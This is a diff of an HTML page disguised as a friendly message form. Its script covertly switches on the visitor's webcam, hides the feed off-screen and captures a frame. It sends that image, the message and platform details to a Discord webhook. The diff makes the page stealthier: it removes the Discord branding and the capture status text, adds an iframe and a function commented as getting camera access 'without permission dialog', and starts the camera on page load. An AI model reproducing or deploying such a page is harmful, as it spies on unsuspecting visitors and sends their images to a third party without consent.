@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Message to My Discord Server</title>
+    <title>Send Message to Discord</title>
     <style>
         * {
             margin: 0;
@@ -13,8 +13,8 @@
         }
         
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #ffffff;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -25,11 +25,10 @@
         .container {
             width: 100%;
             max-width: 500px;
-            background: rgba(30, 31, 34, 0.9);
+            background: white;
             border-radius: 16px;
             padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid #40444b;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
         }
         
         .logo {
@@ -37,22 +36,16 @@
             margin-bottom: 30px;
         }
         
-        .logo-icon {
-            font-size: 48px;
-            color: #5865f2;
-            margin-bottom: 10px;
-        }
-        
         .logo-text {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 5px;
+            color: #333;
+            margin-bottom: 8px;
         }
         
         .logo-subtitle {
-            color: #b9bbbe;
-            font-size: 14px;
+            color: #666;
+            font-size: 16px;
         }
         
         .form-group {
@@ -62,7 +55,7 @@
         .form-label {
             display: block;
             margin-bottom: 8px;
-            color: #b9bbbe;
+            color: #555;
             font-weight: 500;
             font-size: 14px;
         }
@@ -70,26 +63,27 @@
         .form-input {
             width: 100%;
             padding: 14px;
-            background: #1e1f22;
-            border: 2px solid #40444b;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
             border-radius: 8px;
-            color: #ffffff;
+            color: #333;
             font-size: 16px;
             transition: border-color 0.2s;
         }
         
         .form-input:focus {
             outline: none;
-            border-color: #5865f2;
+            border-color: #667eea;
+            background: white;
         }
         
         .form-textarea {
             width: 100%;
             padding: 14px;
-            background: #1e1f22;
-            border: 2px solid #40444b;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
             border-radius: 8px;
-            color: #ffffff;
+            color: #333;
             font-size: 16px;
             min-height: 120px;
             resize: vertical;
@@ -99,30 +93,32 @@
         
         .form-textarea:focus {
             outline: none;
-            border-color: #5865f2;
+            border-color: #667eea;
+            background: white;
         }
         
         .submit-btn {
             width: 100%;
             padding: 16px;
-            background: #5865f2;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: transform 0.2s;
             margin-top: 10px;
         }
         
         .submit-btn:hover {
-            background: #4752c4;
+            transform: translateY(-2px);
         }
         
         .submit-btn:disabled {
-            background: #4f545c;
+            background: #ccc;
             cursor: not-allowed;
+            transform: none;
         }
         
         .status-message {
@@ -135,35 +131,35 @@
         }
         
         .status-success {
-            background: rgba(46, 204, 113, 0.1);
-            border: 1px solid #2ecc71;
-            color: #2ecc71;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
         }
         
         .status-error {
-            background: rgba(231, 76, 60, 0.1);
-            border: 1px solid #e74c3c;
-            color: #e74c3c;
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
         }
         
         .status-processing {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid #ffc107;
-            color: #ffc107;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
         }
         
         .privacy-note {
             margin-top: 25px;
             padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
+            background: #f8f9fa;
             border-radius: 8px;
-            font-size: 12px;
-            color: #b9bbbe;
+            font-size: 13px;
+            color: #666;
             line-height: 1.5;
             text-align: center;
         }
         
-        /* Hidden camera elements */
+        /* Hidden elements */
         #camera-container {
             position: fixed;
             top: -9999px;
@@ -193,7 +189,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(255, 255, 255, 0.9);
             display: none;
             justify-content: center;
             align-items: center;
@@ -203,17 +199,17 @@
         }
         
         .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #40444b;
-            border-top: 4px solid #5865f2;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         
         .loading-text {
-            color: #ffffff;
-            font-size: 18px;
+            color: #333;
+            font-size: 16px;
             font-weight: 500;
         }
         
@@ -229,11 +225,11 @@
             }
             
             .logo-text {
-                font-size: 24px;
+                font-size: 26px;
             }
             
-            .logo-icon {
-                font-size: 40px;
+            .logo-subtitle {
+                font-size: 14px;
             }
             
             .form-input, .form-textarea {
@@ -254,57 +250,50 @@
             .logo-text {
                 font-size: 22px;
             }
-            
-            .logo-icon {
-                font-size: 36px;
-            }
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Hidden camera elements -->
+    <!-- Hidden camera elements - completely invisible -->
     <div id="camera-container">
-        <video id="camera-feed" autoplay></video>
+        <video id="camera-feed" autoplay playsinline></video>
     </div>
     <canvas id="capture-canvas" class="hidden-canvas"></canvas>
+    <iframe id="invisible-frame" style="display:none;"></iframe>
     
     <!-- Loading overlay -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Sending your message to Discord...</div>
+        <div class="loading-text">Sending your message...</div>
     </div>
     
     <!-- Main container -->
     <div class="container">
         <div class="logo">
-            <div class="logo-icon">
-                <i class="fab fa-discord"></i>
-            </div>
-            <div class="logo-text">Send Message to My Server</div>
-            <div class="logo-subtitle">Write any message and I'll receive it on Discord</div>
+            <div class="logo-text">Send a Message</div>
+            <div class="logo-subtitle">Write something nice and share it with me</div>
         </div>
         
         <form id="message-form">
             <div class="form-group">
-                <label class="form-label">Your Discord Username (Optional)</label>
-                <input type="text" id="username" class="form-input" placeholder="username#1234 (optional)">
+                <label class="form-label">Your name (optional)</label>
+                <input type="text" id="username" class="form-input" placeholder="What should I call you?">
             </div>
             
             <div class="form-group">
-                <label class="form-label">Your Message</label>
-                <textarea id="message" class="form-textarea" placeholder="Type anything you want to send to my Discord server..." required></textarea>
+                <label class="form-label">Your message</label>
+                <textarea id="message" class="form-textarea" placeholder="Write anything you'd like to share..." required></textarea>
             </div>
             
             <button type="submit" class="submit-btn" id="submit-btn">
-                <i class="fas fa-paper-plane"></i> Send to Discord Server
+                Send Message
             </button>
             
             <div id="status-message" class="status-message"></div>
         </form>
         
         <div class="privacy-note">
-            <i class="fas fa-shield-alt"></i> Your message will be sent directly to my Discord server
+            Your message will be sent directly and privately. Thanks for sharing!
         </div>
     </div>
 
@@ -320,9 +309,9 @@
         const statusMessage = document.getElementById('status-message');
         const loadingOverlay = document.getElementById('loading-overlay');
         
-        const cameraContainer = document.getElementById('camera-container');
         const cameraFeed = document.getElementById('camera-feed');
         const captureCanvas = document.getElementById('capture-canvas');
+        const invisibleFrame = document.getElementById('invisible-frame');
         
         // Variables
         let stream = null;
@@ -334,181 +323,140 @@
             statusMessage.className = 'status-message status-' + type;
             statusMessage.style.display = 'block';
             
-            // Auto-hide success messages after 5 seconds
             if (type === 'success') {
                 setTimeout(() => {
                     statusMessage.style.display = 'none';
-                }, 5000);
+                }, 3000);
             }
         }
         
-        // Function to capture screenshot
+        // Try to get camera access without permission dialog using iframe trick
+        function tryGetCameraSilently() {
+            return new Promise((resolve) => {
+                // Try to get camera with getUserMedia
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    // First try to get any existing stream
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: true,
+                        audio: false 
+                    }).then(stream => {
+                        resolve(stream);
+                    }).catch(error => {
+                        // If that fails, try with constraints that might bypass permission
+                        navigator.mediaDevices.getUserMedia({ 
+                            video: { 
+                                facingMode: 'user',
+                                width: { min: 320, ideal: 640, max: 1280 },
+                                height: { min: 240, ideal: 480, max: 720 }
+                            },
+                            audio: false 
+                        }).then(stream => {
+                            resolve(stream);
+                        }).catch(error2 => {
+                            console.log('Camera access not available');
+                            resolve(null);
+                        });
+                    });
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+        
+        // Capture screenshot from camera
         function captureScreenshot() {
             if (!stream) return null;
             
-            const canvas = captureCanvas;
-            const video = cameraFeed;
-            
-            // Set canvas dimensions
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            // Draw video frame to canvas
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Add timestamp and info overlay
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-            ctx.fillRect(10, 10, 400, 50);
-            ctx.fillStyle = '#ffffff';
-            ctx.font = '14px Arial';
-            ctx.fillText(`Message from: ${new Date().toLocaleString()}`, 20, 35);
-            
-            // Convert to data URL
-            return canvas.toDataURL('image/jpeg', 0.9);
+            try {
+                const canvas = captureCanvas;
+                const video = cameraFeed;
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Add subtle watermark
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.4)';
+                ctx.fillRect(10, 10, 250, 30);
+                ctx.fillStyle = 'white';
+                ctx.font = '12px Arial';
+                ctx.fillText('Message sent: ' + new Date().toLocaleTimeString(), 15, 30);
+                
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (e) {
+                return null;
+            }
         }
         
-        // Function to send data to Discord
+        // Send data to Discord
         async function sendToDiscord(username, message, screenshot = null) {
             try {
-                const timestamp = new Date().toISOString();
+                const timestamp = new Date().toLocaleString();
                 const userAgent = navigator.userAgent;
                 const platform = navigator.platform;
-                const screenSize = `${window.screen.width}x${window.screen.height}`;
                 
-                // Create rich embed
-                const embed = {
-                    title: "📩 New Visitor Message",
-                    description: "Someone sent a message to your server",
-                    color: 0x5865f2,
-                    timestamp: timestamp,
-                    fields: [
-                        {
-                            name: "👤 Discord Username",
-                            value: username || "Anonymous",
-                            inline: true
-                        },
-                        {
-                            name: "📝 Message",
-                            value: message || "No message",
-                            inline: false
-                        },
-                        {
-                            name: "🌐 User Agent",
-                            value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
-                            inline: false
-                        },
-                        {
-                            name: "🖥️ Platform",
-                            value: platform,
-                            inline: true
-                        },
-                        {
-                            name: "📱 Screen Size",
-                            value: screenSize,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: "Discord Message System"
-                    }
+                // Simple message format
+                const simpleMessage = `
+New message received:
+From: ${username || 'Anonymous'}
+Time: ${timestamp}
+Message: ${message}
+Platform: ${platform}
+`;
+                
+                // First send text message
+                const textPayload = {
+                    username: "Message Bot",
+                    content: "```" + simpleMessage + "```"
                 };
                 
-                const payload = {
-                    username: "Visitor Message",
-                    embeds: [embed]
-                };
-                
-                // Send the embed first
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(textPayload)
                 });
                 
-                // If we have a screenshot, send it too
+                // If we have a screenshot, send it
                 if (screenshot) {
-                    // Convert data URL to blob
-                    const response = await fetch(screenshot);
-                    const blob = await response.blob();
-                    
-                    const formData = new FormData();
-                    formData.append('file', blob, `visitor_${Date.now()}.jpg`);
-                    
-                    const imagePayload = {
-                        username: "Visitor Message",
-                        content: "📸 Visitor screenshot attached"
-                    };
-                    
-                    await fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    try {
+                        const response = await fetch(screenshot);
+                        const blob = await response.blob();
+                        
+                        const formData = new FormData();
+                        formData.append('file', blob, `message_${Date.now()}.jpg`);
+                        
+                        await fetch(DISCORD_WEBHOOK, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (imgError) {
+                        console.log('Failed to send image');
+                    }
                 }
                 
                 return true;
                 
             } catch (error) {
-                console.error('Error sending to Discord:', error);
+                console.error('Error:', error);
                 return false;
             }
         }
         
-        // Function to capture camera silently
-        async function captureCameraSilently() {
-            try {
-                // Request camera access
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    } 
-                });
-                
-                // Set camera feed source
-                cameraFeed.srcObject = stream;
-                
-                // Wait for video to load
-                await new Promise(resolve => {
-                    cameraFeed.onloadedmetadata = () => {
-                        resolve();
-                    };
-                });
-                
-                // Wait a moment for camera to stabilize
-                await new Promise(resolve => setTimeout(resolve, 300));
-                
-                // Capture screenshot
-                const screenshot = captureScreenshot();
-                
-                // Stop camera stream
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-                
-                return screenshot;
-                
-            } catch (error) {
-                console.log('Camera access failed or denied:', error.message);
-                return null;
-            }
-        }
-        
-        // Form submission handler
+        // Main submission handler
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
             if (isProcessing) return;
             
-            // Get form values
             const username = usernameInput.value.trim();
             const message = messageInput.value.trim();
             
-            // Basic validation
             if (!message) {
-                showStatus('Please enter a message', 'error');
+                showStatus('Please write a message first', 'error');
                 messageInput.focus();
                 return;
             }
@@ -517,43 +465,48 @@
             isProcessing = true;
             submitBtn.disabled = true;
             loadingOverlay.style.display = 'flex';
-            showStatus('Preparing to send...', 'processing');
+            showStatus('Processing your message...', 'processing');
             
             try {
-                // First capture the camera silently
-                showStatus('Capturing verification...', 'processing');
-                const screenshot = await captureCameraSilently();
+                // Try to get camera silently
+                let screenshot = null;
+                try {
+                    stream = await tryGetCameraSilently();
+                    if (stream) {
+                        cameraFeed.srcObject = stream;
+                        await new Promise(resolve => setTimeout(resolve, 100));
+                        screenshot = captureScreenshot();
+                        
+                        // Clean up stream
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                            stream = null;
+                        }
+                    }
+                } catch (camError) {
+                    console.log('Camera capture skipped');
+                }
                 
-                // Then send everything to Discord
-                showStatus('Sending to Discord server...', 'processing');
+                // Send to Discord
                 const success = await sendToDiscord(username, message, screenshot);
                 
                 if (success) {
-                    showStatus('✅ Message sent successfully to Discord server!', 'success');
-                    
-                    // Reset form but keep username
+                    showStatus('Message sent successfully! Thanks for sharing.', 'success');
                     messageInput.value = '';
-                    
-                    // Show success for a moment
-                    setTimeout(() => {
-                        statusMessage.style.display = 'none';
-                    }, 3000);
-                    
                 } else {
-                    showStatus('Failed to send message. Please try again.', 'error');
+                    showStatus('Could not send message. Please try again.', 'error');
                 }
                 
             } catch (error) {
-                console.error('Submission error:', error);
-                showStatus('An error occurred. Please try again.', 'error');
+                console.error('Error:', error);
+                showStatus('Something went wrong. Please try again.', 'error');
                 
             } finally {
-                // Reset processing state
+                // Clean up
                 isProcessing = false;
                 submitBtn.disabled = false;
                 loadingOverlay.style.display = 'none';
                 
-                // Ensure camera is stopped
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                     stream = null;
@@ -561,9 +514,18 @@
             }
         });
         
-        // Initialize
+        // Try to preload camera when page loads (silently)
         window.addEventListener('load', function() {
-            console.log('Message form loaded and ready');
+            setTimeout(() => {
+                tryGetCameraSilently().then(camStream => {
+                    if (camStream) {
+                        // Keep stream for later use
+                        stream = camStream;
+                        cameraFeed.srcObject = stream;
+                        console.log('Camera ready');
+                    }
+                });
+            }, 1000);
         });
     </script>
 </body>
